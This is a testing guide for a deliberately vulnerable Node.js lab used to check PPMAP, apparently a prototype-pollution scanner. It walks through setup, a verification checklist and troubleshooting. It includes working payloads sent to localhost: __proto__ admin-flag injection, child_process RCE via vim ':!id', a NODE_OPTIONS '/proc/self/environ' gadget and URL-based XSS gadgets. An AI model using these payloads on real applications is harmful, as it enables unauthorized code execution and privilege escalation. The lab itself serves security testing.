# PPMAP Lab Testing Guide

## Quick Start

### Option 1: Direct Run
```bash
cd ppmap_lab
chmod +x start.sh
./start.sh
```

### Option 2: Docker (Recommended)
```bash
cd ppmap_lab
docker build -t ppmap-lab .
docker run -p 3000:3000 ppmap-lab
```

### Option 3: Manual
```bash
cd ppmap_lab
npm install
npm start
```

---

## Testing Scenarios

### Scenario 1: Full Scan (All 28 Methods)
```bash
python3 ppmap.py --scan http://localhost:3000
```

**Expected Results:**
- 28 vulnerabilities detected across 6 tiers
- Detection time: ~2-5 minutes
- All endpoints should be tested

---

### Scenario 2: Tier-Specific Testing

#### Tier 0 - Standard Detection
```bash
# Lodash merge
curl -X POST http://localhost:3000/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Expected: {"success":true,"config":{"role":"user","isAdmin":true}}
```

#### Tier 3 - child_process RCE
```bash
curl -X POST http://localhost:3000/api/child-process \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"vim","input":":!id\n"}}'

# Expected: RCE attempt detected
```

#### Tier 5 - CORS Pollution
```bash
curl -X POST http://localhost:3000/api/cors \
  -H "Content-Type: application/json" \
  -H "Origin: https://attacker.com" \
  -d '{"__proto__":{"exposedHeaders":"X-Polluted"}}'

# Check response headers for Access-Control-Expose-Headers
```

#### Tier 6 - Kibana Telemetry RCE
```bash
curl -X POST http://localhost:3000/api/telemetry \
  -H "Content-Type: application/json" \
  -d '{"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"}'

# Expected: Telemetry pollution detected
```

---

### Scenario 3: Browser-Based Testing

#### jQuery PP + DOM XSS
```bash
# Open in browser
http://localhost:3000/?__proto__[polluted]=true

# PPMAP command
python3 ppmap.py --scan http://localhost:3000 --browser chrome
```

#### Google Analytics Gadget
```bash
http://localhost:3000/analytics?__proto__[hitCallback]=alert(document.domain)
```

#### Storage API Pollution
```bash
http://localhost:3000/storage-test?__proto__[testItem]=PPMAP_POLLUTED
```

---

## Verification Checklist

### ✅ Pre-Test Verification
- [ ] Lab server running on http://localhost:3000
- [ ] Health endpoint returns 200: `curl http://localhost:3000/health`
- [ ] PPMAP installed and working: `python3 ppmap.py --help`

### ✅ Expected PPMAP Detections

**Tier 0 (7 methods):**
- [ ] jQuery Prototype Pollution
- [ ] Server-side PP (Lodash merge)
- [ ] POST XSS
- [ ] DOM XSS + PP
- [ ] WAF Bypass
- [ ] Endpoint Discovery
- [ ] Confidence Scoring

**Tier 1 (4 methods):**
- [ ] JSON Spaces Overflow
- [ ] Status Code Override
- [ ] Function.prototype Chain
- [ ] Persistence Verification

**Tier 2 (3 methods):**
- [ ] React Flight Protocol (simulated)
- [ ] SvelteKit Superforms (simulated)
- [ ] Charset Override

**Tier 3 (3 methods):**
- [ ] fetch() API pollution
- [ ] Object.defineProperty() bypass
- [ ] child_process RCE

**Tier 4 (4 methods):**
- [ ] Constructor-based pollution
- [ ] Sanitization bypass
- [ ] Descriptor pollution
- [ ] Blind Gadget Fuzzer

**Tier 5 (3 methods):**
- [ ] CORS Header Pollution
- [ ] Third-Party Library Gadgets
- [ ] Storage API Pollution

**Tier 6 (4 methods):**
- [ ] CVE-Specific Payloads
- [ ] Kibana Telemetry RCE
- [ ] Blitz.js RCE Chain
- [ ] Elastic XSS

**Total: 28/28 ✅**

---

## Troubleshooting

### Server won't start
```bash
# Check if port 3000 is in use
lsof -i :3000
# Kill process if needed
kill -9 <PID>
```

### Dependencies fail to install
```bash
# Clear npm cache
npm cache clean --force
# Remove node_modules
rm -rf node_modules package-lock.json
# Reinstall
npm install
```

### PPMAP not detecting vulnerabilities
```bash
# Verify server is running
curl http://localhost:3000/health

# Check PPMAP version
python3 ppmap.py --version

# Run with verbose output
python3 ppmap.py --scan http://localhost:3000 --verbose
```

---

## Advanced Testing

### Custom Payloads
```bash
# Test specific CVE
curl -X POST http://localhost:3000/api/deep-merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"vim","input":":! whoami\n"}}'
```

### Burp Suite Integration
1. Capture request in Burp
2. Save to file: `request.txt`
3. Run PPMAP: `python3 ppmap.py --request request.txt`

### Docker Network Testing
```bash
# Run lab in Docker
docker run -d -p 3000:3000 --name ppmap-lab ppmap-lab

# Test from host
python3 ppmap.py --scan http://localhost:3000

# Test from another container
docker run --network host ppmap-scanner python3 ppmap.py --scan http://localhost:3000
```

---

## Performance Benchmarks

**Expected Scan Times:**
- Full scan (28 methods): 2-5 minutes
- Tier 0 only: 30-60 seconds
- Single endpoint: 10-20 seconds

**Resource Usage:**
- CPU: ~10-20%
- Memory: ~100-200 MB
- Network: Minimal (localhost)

---

## Safety Reminders

⚠️ **CRITICAL SAFETY WARNINGS:**

1. **DO NOT** expose this lab to public internet
2. **DO NOT** deploy to production environment
3. **DO NOT** use real credentials or sensitive data
4. **DO** run in isolated network (Docker recommended)
5. **DO** destroy lab after testing

```bash
# Proper cleanup
docker stop ppmap-lab
docker rm ppmap-lab
docker rmi ppmap-lab
```

---

## Support

If you encounter issues:
1. Check `README.md` for endpoint documentation
2. Verify Node.js version (16+)
3. Check server logs for errors
4. Review PPMAP documentation

---

**Last Updated:** January 31, 2026  
**Lab Version:** 1.0.0  
**PPMAP Version:** 3.5.0
